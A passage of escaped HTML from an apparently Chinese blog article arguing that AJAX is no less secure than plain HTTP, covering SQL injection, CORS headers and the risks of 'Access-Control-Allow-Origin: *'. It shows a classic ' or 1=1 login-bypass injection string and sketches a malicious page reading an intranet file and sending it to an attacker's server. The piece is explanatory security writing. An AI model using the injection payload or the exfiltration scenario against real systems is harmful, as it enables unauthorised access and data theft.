data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22SELECT * FROM  users  WHERE name = \x27\x27\x27\x27 AND password = \x27\x27\x27\x27  or 1=1  \x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3eSELECT * FROM  users  WHERE name = \x3cspan class=\x22hljs-string\x22\x3e\x27\x27\x3c\/span\x3e\x3cspan class=\x22hljs-string\x22\x3e\x27\x27\x3c\/span\x3e AND password = \x3cspan class=\x22hljs-string\x22\x3e\x27\x27\x3c\/span\x3e\x3cspan class=\x22hljs-string\x22\x3e\x27\x27\x3c\/span\x3e  or \x3cspan class=\x22hljs-number\x22\x3e1\x3c\/span\x3e=\x3cspan class=\x22hljs-number\x22\x3e1\x3c\/span\x3e  \x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。\x3c\/p\x3e\n\x3cp\x3e当然了，像这类这么低级的漏洞，现象几乎已经不存在了，往往这类型漏洞需要仔细分析，耗时。（又或者是有内奸。。。）\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e修正内容：\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e以前是将\x3ccode\x3eor\x3c\/code\x3e语句放在\x3ccode\x3ename\x3c\/code\x3e中，修正后放在\x3ccode\x3epassword\x3c\/code\x3e中，因为放name中只能匹配到和输入password相符合的，但是放password中，能匹配所有。\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader11\x22\x3eSQL注入与AJAX的关系\x3c\/h3\x3e\n\x3cp\x3e额，从上述的示例中看不出和AJAX有什么关系。但是我们可以这样假设：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. 有一个接口，接收AJAX post的数据\n\n2. 数据中有一个字段 \x27name\x27，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了\n\n3. 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e 有一个接口，接收AJAX post的数据\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e 数据中有一个字段 \x3cspan class=\x22hljs-string\x22\x3e\x27name\x27\x3c\/span\x3e，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了\n\n\x3cspan class=\x22hljs-number\x22\x3e3.\x3c\/span\x3e 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e对，就是这样极端的情况下才会发生，而且与AJAX并没有关系，\x3cstrong\x3e因为换成任何一种其它请求都会有类似的情况\x3c\/strong\x3e。。。\x3c\/p\x3e\n\x3cp\x3e所以说，结论是：\x3cstrong\x3eSQL注入与AJAX无关\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader12\x22\x3eAJAX和HTTP请求的区别\x3c\/h2\x3e\n\x3cp\x3e从本质上将：\x3cstrong\x3eAJAX就是浏览器发出的HTTP请求\x3c\/strong\x3e，只不过是浏览器加上了一个同源策略限制而已。\x3c\/p\x3e\n\x3cp\x3eAJAX请求的\x3ccode\x3eXMLHTTPRequest\x3c\/code\x3e对象就是浏览器开放给JS调用HTTP请求用的。\x3c\/p\x3e\n\x3cp\x3e那么AJAX和HTTP的区别呢？列出以下几点：\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3eAJAX请求受到浏览器的同源策略限制，存在跨域问题\x3c\/li\x3e\n\x3cli\x3eAJAX在进行复杂请求时，浏览器会预先发出\x3ccode\x3eOPTIONS\x3c\/code\x3e预检（HTTP自己是不会预检的）\x3c\/li\x3e\n\x3cli\x3e从使用角度上说，AJAX使用简单一点，少了些底层细节，多了些浏览器特性（如自动带上同域cookie等）\x3c\/li\x3e\n\x3cli\x3e所以说，和认证上的HTTP请求的区别就是-多了一次浏览器的封装而已（浏览器会有自己的预处理，加上特定限制）\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3cp\x3e但是，从最终发出的报文来看，内容都是一样的（HTTP协议规范的内容），\x3cstrong\x3eAJAX是发送HTTP请求的一种方式\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e所以从这一点可以得出一个结论：\x3cstrong\x3eAJAX本质上安全性和HTTP请求一样\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693786?w=565\x26amp;h=493\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693786?w=565\x26amp;h=493\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader13\x22\x3eCORS与AJAX安全性之间的关联\x3c\/h2\x3e\n\x3cp\x3e按照前文中提到的内容，基本无法得出AJAX与请求不安全的关联。那么接下来，再继续分析，如果使用了跨域资源共享（CORS）后的安全性。\x3cbr\x3e(因为往往ajax都会伴随着CORS)\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader14\x22\x3eCORS与AJAX关系的简介\x3c\/h3\x3e\n\x3cp\x3e这是一个跨域共享方案，大致流程就是：（仅以复杂请求的预检举例-这一部分要求提前掌握CORS相关知识）\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端\n\n2. 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，\n否则直接无情的拒绝掉\n\n3. 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。\n否则就是正常的响应，接下来发出真正的请求（如POST）\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，\n否则直接无情的拒绝掉\n\n\x3cspan class=\x22hljs-number\x22\x3e3.\x3c\/span\x3e 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。\n否则就是正常的响应，接下来发出真正的请求（如POST）\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e请求和响应的头部信息大概如下：\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3eRequest Headers\x3c\/strong\x3e\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\/\/ 在CORS中专门作为Origin信息供后端比对，表示来源域。\nOrigin: http:\/\/xxx\nAccess-Control-Request-Headers: X-Requested-With\n\/\/ 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上\nAccess-Control-Request-Method: OPTIONS\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-comment\x22\x3e\/\/ 在CORS中专门作为Origin信息供后端比对，表示来源域。\x3c\/span\x3e\nOrigin: http:\x3cspan class=\x22hljs-comment\x22\x3e\/\/xxx\x3c\/span\x3e\nAccess-Control-Request-Headers: X-Requested-With\n\x3cspan class=\x22hljs-comment\x22\x3e\/\/ 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上\x3c\/span\x3e\nAccess-Control-Request-Method: OPTIONS\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e\x3cstrong\x3eResponse Headers\x3c\/strong\x3e\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Origin: http:\/\/xxx\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3eAccess-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Origin: http:\x3cspan class=\x22hljs-comment\x22\x3e\/\/xxx\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e最终，客户端发出的请求，必须符合服务端的校验规则才能正确，服务端才会返回正确头部，否则只会请求失败。报跨域错误。\x3c\/p\x3e\n\x3cp\x3e以上仅是简介，更多信息可以参考来源中的\x3ccode\x3eajax跨域，这应该是最全的解决方案了\x3c\/code\x3e\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader15\x22\x3e为什么要配置CORS？\x3c\/h3\x3e\n\x3cp\x3e因为同源策略限制，AJAX无法请求跨域资源，CORS可以解决AJAX跨域请求问题。\x3c\/p\x3e\n\x3cp\x3e因此：\x3cstrong\x3e在本文中，配置CORS只是为了AJAX能跨域请求\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader16\x22\x3eCORS会配置些什么信息？\x3c\/h3\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Origin: http:\/\/xxx\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3eAccess-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Origin: http:\x3cspan class=\x22hljs-comment\x22\x3e\/\/xxx\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e如上，加上这个配置后，必须符合要求的才算是正常的请求，否则就会拒绝掉，一般AJAX跨域的话都会有OPTIONS，所以在预检中就做了这一步。\x3c\/p\x3e\n\x3cp\x3e可以看到，关键的可变信息是：\x3ccode\x3eAccess-Control-Allow-Origin: http:\/\/xxx\x3c\/code\x3e\x3c\/p\x3e\n\x3cp\x3e这个配置就是域名白名单，规定在什么样的域名下才能进行AJAX跨域请求。\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader17\x22\x3eCORS \x3ccode\x3eOrigin: *\x3c\/code\x3e的安全性\x3c\/h3\x3e\n\x3cp\x3e关键问题来了，在上面的CORS配置是这样的：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22Access-Control-Allow-Origin: http:\/\/xxx\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3eAccess-Control-Allow-Origin: http:\x3cspan class=\x22hljs-comment\x22\x3e\/\/xxx\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e但是这个配置只允许特定域名访问，鉴于前端的复杂性，有时候调试起来不是很方便，因此有时候，会偷懒的设置为：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22Access-Control-Allow-Origin: *\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3eAccess-Control-Allow-Origin: *\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e这个代表所有来源的跨域AJAX请求都能正常响应。\x3c\/p\x3e\n\x3cp\x3e接下来我们再来分析设置\x3ccode\x3eOrigin: *\x3c\/code\x3e可能带来哪些问题。（都是基于AJAX的情况）\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e问题1：会对cookie认证造成影响么？\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e不会。虽然\x3ccode\x3e*\x3c\/code\x3e代表了所有来源都能正常请求，但是同源策略下，是无法带上跨域cookie的。因此根本无法用身份验证。\x3c\/p\x3e\n\x3cp\x3e而且，就算用\x3ccode\x3ewithCredentials\x3c\/code\x3e强行带上跨域cookie，因为后台没有支持，所以会报错。（这可以看成是CORSs模型的最后一道防线）\x3c\/p\x3e\n\x3cp\x3e再者，后台就算配置\x3ccode\x3eAccess-Control-Allow-Credentials\x3c\/code\x3e允许跨域cookie，但是这时候的安全策略是\x3ccode\x3eOrigin\x3c\/code\x3e不允许为*，必须是一个明确的地址。\x3cbr\x3e（否则你就可以看到浏览器的报错信息-跨域cookie时，Origin不允许为*）\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e问题2：如果伪造Origin头部呢？\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e首先，标准的浏览器中是不允许你伪造的（除非有严重漏洞），所以一般需要通过模拟客户端请求伪造。\x3c\/p\x3e\n\x3cp\x3e但是。在非浏览器情况下，本来就没有同源策略。这又是何必。。。\x3c\/p\x3e\n\x3cp\x3e所以说，伪造Origin与CORS并没有关系。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e问题3：如果后台本来就存在漏洞呢？\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e做这样一个假设，假设用户所在网络的内网中有一台内网服务器，并且配置了允许所有的跨域请求：（当然，外网是请求不到内网的）\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\/\/ 允许任何来自任意域的跨域请求\nAccess-Control-Allow-Origin: *\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-comment\x22\x3e\/\/ 允许任何来自任意域的跨域请求\x3c\/span\x3e\nAccess-Control-Allow-Origin: *\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e再假设内网服务器上恰巧存在敏感资源，并且没有额外设防，只要内网就能访问。譬如：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22192.168.111.23\/users.md\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e192.168\x3c\/span\x3e\x3cspan class=\x22hljs-number\x22\x3e.111\x3c\/span\x3e\x3cspan class=\x22hljs-number\x22\x3e.23\x3c\/span\x3e\/users.md\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e然后用户访问了恶意网页，而像HTML之类的网页都是下载到本地执行的，\x3cbr\x3e正好网页内有恶意代码，去向\x3ccode\x3e192.168.111.23\/users.md\x3c\/code\x3e请求资源，再将接收到的服务端返回发送到攻击者服务器。\x3cbr\x3e（因为加了Origin为*，而且AJAX是由本地浏览器发出的，所以用户下载到本地的恶意网站是可以访问到用户内网中的后台的）\x3c\/p\x3e\n\x3cp\x3e然后这些敏感数据就这样被盗取了。\x3c\/p\x3e\n\x3cp\x3eBut，这是因为服务端漏洞而存在的问题，设置Origin为\x3cem\x3e的后台上为何要放置敏感资源？正常设置为Origin为\x3c\/em\x3e的最大作用是用作公共API。\x3cbr\x3e而且更重要的是，为何敏感资源就这样轻易的被获取了？为什么没有二次验证？\x3c\/p\x3e\n\x3cp\x3eSO，后台本身有漏洞，所以才导致被攻击，AJAX恰好是攻击的手段之一（除了AJAX外还会有其它的方式），所以很多锅都甩到了AJAX头上。\x3c\/p\x3e\n\x3cp\x3e这样，可以得出一个保守点的结论：\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3eOrigin如果不是\x3ccode\x3e*\x3c\/code\x3e，AJAX请求并不会有安全问题，如果是\x3ccode\x3e*\x3c\/code\x3e，可能会由于后台的漏洞，不经意间，AJAX就被作为一种攻击手段了，导致了出现AJAX不安全的说法\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693787?w=880\x26amp;h=476\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693787?w=880\x26amp;h=476\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader18\x22\x3e再看，AJAX请求真的不安全么？\x3c\/h2\x3e\n\x3cp\x3e仍然是最初的结论：\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e我们可以看到，XSS也好，CSRF也好，以及其它隐藏的可能漏洞也好，本质上都是后台已有漏洞造成的问题，AJAX最多是被用作一种攻击手段（甚至某些里面AJAX还无法使用）\x3c\/p\x3e\n\x3cp\x3e提到AJAX请求不安全的，譬如有CORS里面配置\x3ccode\x3eOrigin: *\x3c\/code\x3e造成某些极端情况下能通过AJAX发出攻击。但事实上这也是其中的一种攻击手段而已，没有AJAX，该不安全的仍然不安全。\x3c\/p\x3e\n\x3cp\x3e譬如还有的说法是：因为在AJAX出现以前，如果出现安全漏洞，容易被察觉，但AJAX是异步的，更容易隐式的出现安全问题。。。这也与安全性的本质无关。\x3c\/p\x3e\n\x3cp\x3e最重要一点，从Web应用安全角度来谈，Web应用必须从不信任客户端。所以不要再把锅甩给AJAX。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader19\x22\x3eAJAX请求哪里不安全？\x3c\/h2\x3e\n\x3cp\x3e同上，AJAX本身并不存在这种安全问题。\x3c\/p\x3e\n\x3cp\x3e不过有一点需注意，如果使用了CORS方案。\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. Allow-Origin可以设置特定的值，过滤特定的白名单\n\n2. 对于一些公共的API，可以直接将Allow-Origin设置为`*`\n\n3. 当然，如果确认后台没有这些隐藏漏洞，可以直接使用`*`，毕竟也只是针对浏览器的同源策略而已，影响没有那么大。\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e Allow-Origin可以设置特定的值，过滤特定的白名单\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e 对于一些公共的API，可以直接将Allow-Origin设置为\x3cspan class=\x22hljs-string\x22\x3e`*`\x3c\/span\x3e\n\n\x3cspan class=\x22hljs-number\x22\x3e3.\x3c\/span\x3e 当然，如果确认后台没有这些隐藏漏洞，可以直接使用\x3cspan class=\x22hljs-string\x22\x3e`*`\x3c\/span\x3e，毕竟也只是针对浏览器的同源策略而已，影响没有那么大。\x3c\/code\x3e\x3c\/pre\x3e\n\x3ch2 id=\x22articleHeader20\x22\x3e怎么样让AJAX请求更安全？\x3c\/h2\x3e\n\x3cp\x3e仍然是文中反复提到的结论：\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e让Web后台更安全，则AJAX请求也更安全，反之后台有漏洞，不管怎么样都是不安全的\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader21\x22\x3e写在最后的话\x3c\/h2\x3e\n\x3cp\x3e这样的话，应该可以把AJAX不安全的锅甩掉了吧？\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader22\x22\x3e附录\x3c\/h2\x3e\n\x3ch3 id=\x22articleHeader23\x22\x3e参考资料\x3c\/h3\x3e\n\x3cul\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/zh.wikipedia.org\/wiki\/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e跨站请求伪造\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/zh.wikipedia.org\/wiki\/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e跨站脚本\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/www.cnblogs.com\/hyddd\/archive\/2009\/04\/09\/1432744.html\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e浅谈CSRF攻击方式\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22http:\/\/blog.csdn.net\/ghsau\/article\/details\/17027893\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3eXSS攻击及防御\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/www.cnblogs.com\/lovesong\/p\/5199623.html\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e前端安全之XSS攻击\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22http:\/\/blog.csdn.net\/wei00d6ra\/article\/details\/39137849\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3eAJAX真的不安全？\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/segmentfault.com\/q\/1010000002500378\/a-1020000002502912\x22\x3eAJAX 如何保证数据的安全性？\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22http:\/\/blog.csdn.net\/fengyinchao\/article\/details\/50775121\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3eWeb 开发常见安全问题\x3c\/a\x3e\x3c\/li\x3e\n\x3cli\x3e\x3ca 